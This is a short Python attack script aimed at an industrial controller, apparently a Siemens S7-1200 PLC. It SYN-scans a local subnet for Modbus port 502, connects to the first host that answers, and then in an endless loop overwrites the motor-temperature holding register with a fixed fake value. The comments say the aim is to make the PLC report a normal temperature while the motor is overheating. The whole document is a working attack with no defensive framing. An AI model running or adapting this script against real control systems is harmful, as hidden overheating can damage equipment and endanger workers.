from scapy.all import *
from pyModbusTCP.client import ModbusClient
import struct

# Network settings
PLC_IP = None  # To be discovered
PLC_PORT = 502  # Modbus TCP Default Port

# **Step 1: Scan the network to find the PLC IP**
def find_plc():
    global PLC_IP
    print("[*] Scanning for Siemens S7-1200 PLC...")

    ans, _ = sr(IP(dst="192.168.1.0/24")/TCP(dport=PLC_PORT, flags="S"), timeout=2, verbose=0)

    for sent, received in ans:
        if received.haslayer(TCP) and received[TCP].flags == 18:  # SYN-ACK response
            print(f"[+] Possible PLC found at {received[IP].src}")
            PLC_IP = received[IP].src
            return PLC_IP
    
    print("[-] No PLC found.")
    return None

# **Step 2: Spoof Reporting Messages**
def spoof_reporting():
    if not PLC_IP:
        print("[-] No PLC IP found. Exiting...")
        return
    
    print(f"[+] Connecting to PLC at {PLC_IP}...")
    client = ModbusClient(host=PLC_IP, port=PLC_PORT, auto_open=True)

    if not client.is_open():
        print("[-] Could not connect to PLC Modbus server.")
        return

    print("[*] Modifying telemetry data...")
    
    # Example: Fake motor temperature (Normal when overheating)
    FAKE_TEMP = 275  # PLC reports normal temp even if actually overheating

    while True:
        # Read motor temp (Register %MW7, assumed at address 7)
        temp_val = client.read_holding_registers(7, 1)
        
        if temp_val:
            actual_temp = temp_val[0]
            print(f"[+] Actual Motor Temp: {actual_temp} - Spoofing as: {FAKE_TEMP}")

            # Write fake temperature back to PLC
            client.write_single_register(7, FAKE_TEMP)

        else:
            print("[-] Could not read Motor Temperature from PLC.")

        time.sleep(2)

# **Execute**
if __name__ == "__main__":
    find_plc()
    spoof_reporting()